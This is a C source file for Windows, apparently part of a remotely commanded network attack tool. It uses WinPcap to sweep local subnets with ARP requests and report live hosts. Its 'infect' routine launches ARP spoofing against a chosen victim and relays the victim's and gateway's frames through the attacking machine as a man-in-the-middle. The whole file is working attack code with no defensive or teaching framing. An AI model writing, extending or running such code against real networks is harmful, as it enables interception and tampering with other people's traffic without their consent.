#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#define HAVE_REMOTE
#define WPCAP
#include <pcap.h>
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "packet.lib")

#include <ws2tcpip.h>
#include <iphlpapi.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#include <Windows.h>
#include <malloc.h>
#include <wchar.h>

#include "network_headers.h"
#include "ipc_manage.h"
#include "commands.h"
#include "spoof.h"
#include "utils.h"


//globals
static HANDLE act_threads[ACTS_NUM];
static send_params send_packets_params;
send_params infect_params;

static DWORD WINAPI send_packets(LPVOID lparam)
{
	PIP_ADDR_STRING addr_lst;
	ether_hdr* ether_header;
	arp_ether_ipv4* arp_header;
	u_char packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
	
	addr_lst = &send_packets_params.adapter->IpAddressList;
	ether_header = (ether_hdr*)packet;
	arp_header = (arp_ether_ipv4*)(packet + sizeof(ether_hdr));

	build_packet(
		packet,
		0,
		0,
		send_packets_params.adapter->Address,
		NULL,
		1
	);

	u_long target;
	u_long netmask;

	while (addr_lst)
	{
		inet_pton(AF_INET, addr_lst->IpMask.String, &netmask);
		inet_pton(AF_INET, addr_lst->IpAddress.String, &target);

		netmask = htonl(netmask);
		target = htonl(target);
		target &= netmask;

		inet_pton(AF_INET, addr_lst->IpAddress.String, &arp_header->spa);
		while (netmask != 0xffffffff)
		{
			arp_header->tpa = htonl(target);
			pcap_sendpacket(send_packets_params.fp, packet, sizeof(packet));
			target++;
			netmask++;
		}

		addr_lst = addr_lst->Next;
	}
	return 0;
}

DWORD WINAPI scan(LPVOID lparam)
{
	//Winpcap
	pcap_t* fp;
	pcap_if_t* alldevs, * temp;
	struct bpf_program fcode;
	int res;
	struct pcap_pkthdr* pkt_header;
	const u_char* pkt_data = NULL;
	host* active_hosts;
	//Windows
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	ULONG outBufLen;

	GetAdaptersInfo(pAdapterInfo, &outBufLen);
	pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
	active_hosts = (host*)malloc(sizeof(host) * MAX_HOSTS);
	if (!pAdapterInfo || !active_hosts)
		return -1;

	GetAdaptersInfo(pAdapterInfo, &outBufLen);
	pcap_findalldevs(&alldevs, NULL);
	
	for (temp = alldevs; temp ; temp = temp->next)
	{
		if (!temp->addresses)
			continue;
		/*open the adapter*/
		fp = pcap_open(
			temp->name,
			sizeof(ether_hdr) + sizeof(arp_ether_ipv4),
			PCAP_OPENFLAG_PROMISCUOUS,
			5000,
			NULL,
			NULL
		);

		/*Filter arp packets only*/
		if (pcap_compile(fp, &fcode, "arp", 1, 0) < 0)
		{
			fprintf(stderr, "\nUnable to compile the packet filter. Check the syntax.\n");
			/* Free the device list */
			free(pAdapterInfo);
			free(active_hosts);
			pcap_freealldevs(alldevs);
			return -1;
		}

		/*Set the filter*/
		if (pcap_setfilter(fp, &fcode) < 0)
		{
			fprintf(stderr, "\nError setting the filter.\n");
			/* Free the device list */
			free(pAdapterInfo);
			free(active_hosts);
			pcap_freealldevs(alldevs);
			return -1;
		}

		/*update globals for send_packet*/
		send_packets_params.adapter = corresponding_adapter(temp, pAdapterInfo);
		send_packets_params.fp = fp;

		/*start send_packet thread*/
		HANDLE hThread;
		hThread = CreateThread(NULL, 0, send_packets, NULL, 0, NULL);
		if (!hThread)
		{
			pcap_close(fp);
			continue;
		}

		arp_ether_ipv4* arp_header;
		memset(active_hosts, 0, sizeof(active_hosts));
		size_t counter = 0;

		/* Retrieve the packets */
		while ((res = pcap_next_ex(fp, &pkt_header, &pkt_data)) >= 0) {
			
			/* Timeout elapsed */
			if (res == 0)
			{
				if (WaitForSingleObject(hThread, 0) == WAIT_OBJECT_0)
				{
					CloseHandle(hThread);
					break;
				}
				continue;
			}

			arp_header = (arp_ether_ipv4*)(pkt_data + sizeof(ether_hdr));

			if (arp_header->op == htons(2))
			{
				active_hosts[counter].ip = arp_header->spa;
				memcpy(active_hosts[counter].mac_addr, arp_header->sha, ETH_ALEN);
				counter++;
				if (counter == MAX_HOSTS)
				{
					send_result((uint8_t*)active_hosts, MAX_HOSTS * sizeof(host));
					memset(active_hosts, 0, sizeof(active_hosts));
					counter = 0;	
				}
			}
		}
		send_result((uint8_t*)active_hosts, MAX_HOSTS * sizeof(host));
		//close adapter
		pcap_close(fp);
	}

	free(pAdapterInfo);
	free(active_hosts);
	pcap_freealldevs(alldevs);
	
	return 0;
}

DWORD WINAPI infect(LPVOID lparam)
{
	pCommand command = (pCommand)lparam;
	
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	ULONG outBufLen = 0;
	ULONG netmask, host;

	pcap_t* fp;
	pcap_if_t* alldevs = NULL, * adapter;
	pcap_addr_t* addr;

	char* filter; 
	size_t filter_size;
	char temp_filter[] = "ip host";
	struct in_addr n_addr;
	struct bpf_program fcode;
	int res;
	struct pcap_pkthdr* pkt_header;
	const u_char* pkt_data = NULL;

	
	/* allocate heap memory */
	n_addr.S_un.S_addr = htonl(infect_params.victim_ip);
	filter_size = strlen(temp_filter) + strlen(inet_ntoa(n_addr)) + 2; // space and null terminator (2).
	filter = (char*)malloc(filter_size);

	GetAdaptersInfo(pAdapterInfo, &outBufLen);
	pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);

	pcap_findalldevs(&alldevs, NULL);

	/* check if allocation worked successfully */
	if (!pAdapterInfo || !filter || !alldevs)
		return -1;

	GetAdaptersInfo(pAdapterInfo, &outBufLen);

	for (adapter = alldevs; adapter; adapter = adapter->next)
	{
		int found = 0; //false
		for (addr = adapter->addresses; addr; addr = addr->next)
		{
			host = ((struct sockaddr_in*)(addr->addr))->sin_addr.s_addr;
			netmask = ((struct sockaddr_in*)(addr->netmask))->sin_addr.s_addr;

			if ((host & netmask) == (command->victim_ip & netmask))
			{
				found = 1; //true
				break;
			}
		}
		if (found)
			break;
	}

	if (!adapter)
		return -1;

	/*open the adapter*/
	fp = pcap_open(
		adapter->name,
		65536,
		PCAP_OPENFLAG_PROMISCUOUS,
		1000,
		NULL,
		NULL
	);

	/* create filter */
	snprintf(filter, filter_size, "%s %s\n", temp_filter, inet_ntoa(n_addr));
	if (pcap_compile(fp, &fcode, filter, 1, netmask) < 0)
	{
		free(pAdapterInfo);
		pcap_freealldevs(alldevs);
		return -1;
	}

	if (pcap_setfilter(fp, &fcode) < 0)
	{
		free(pAdapterInfo);
		pcap_freealldevs(alldevs);
		return -1;
	}

	infect_params.fp = fp;
	infect_params.adapter = corresponding_adapter(adapter, pAdapterInfo);
	
	/*start send_packet thread*/
	HANDLE hThread;
	hThread = CreateThread(NULL, 0, start_arp_spoofing, NULL, 0, NULL);
	if (!hThread)
	{
		pcap_close(fp);
		return -1;
	}

	while ((res = pcap_next_ex(fp, &pkt_header, &pkt_data)) >= 0)
	{
		/* Timeout elapsed */
		if (res == 0)
		{
			if (WaitForSingleObject(hThread, 0) == WAIT_OBJECT_0)
			{
				CloseHandle(hThread);
				break;
			}
			continue;
		}

		ether_hdr* eth_header;
		eth_header = (ether_hdr*)pkt_data;

		/* change packet src/dst (MITM) */
		memcmp(eth_header->src_addr, infect_params.victim_mac, ETH_ALEN) == 0 // if src = taget
			? memcpy(eth_header->dest_addr, infect_params.gateway_mac, ETH_ALEN) // (dst = gateway)
			: memcpy(eth_header->dest_addr, infect_params.victim_mac, ETH_ALEN); // else (dst = victim) 
		memcpy(eth_header->src_addr, infect_params.adapter->Address, ETH_ALEN); // src = this
		
		/* Check for DNS */


		/* foward packet */
		pcap_sendpacket(fp, pkt_data, pkt_header->caplen);
		
	}
	//deal with routing stuff (wait for DNS sessions)
	
	return 0;
}

void execute_command(pCommand command)
{
	
	switch (command->act)
	{
	case SCAN:
		//check if thread not active
		if (WaitForSingleObject(act_threads[SCAN], 0) != WAIT_OBJECT_0)
		{
			act_threads[SCAN] = CreateThread(
				NULL,
				0,
				scan,
				(LPVOID)command,
				0,
				NULL
			);
		}
		break;
	case INFECT:
		//check if thread not active
		if (WaitForSingleObject(act_threads[INFECT], 0) != WAIT_OBJECT_0)
		{
			infect_params.gateway_ip = command->gateway_ip;
			infect_params.victim_ip = command->victim_ip;
			memcpy(infect_params.gateway_mac, command->gateway_mac, ETH_ALEN);
			memcpy(infect_params.victim_mac, command->victim_mac, ETH_ALEN);

			act_threads[INFECT] = CreateThread(
				NULL,
				0,
				infect,
				(LPVOID)command,
				0,
				NULL
			);
		}
		break;
	case STOP_S:
		TerminateThread(act_threads[SCAN], 0);
		break;
	case STOP_I:
		TerminateThread(act_threads[INFECT], 0);
		break;
	case STOP_A:
		TerminateThread(act_threads[SCAN], 0);
		TerminateThread(act_threads[INFECT], 0);
		break;
	}
	
}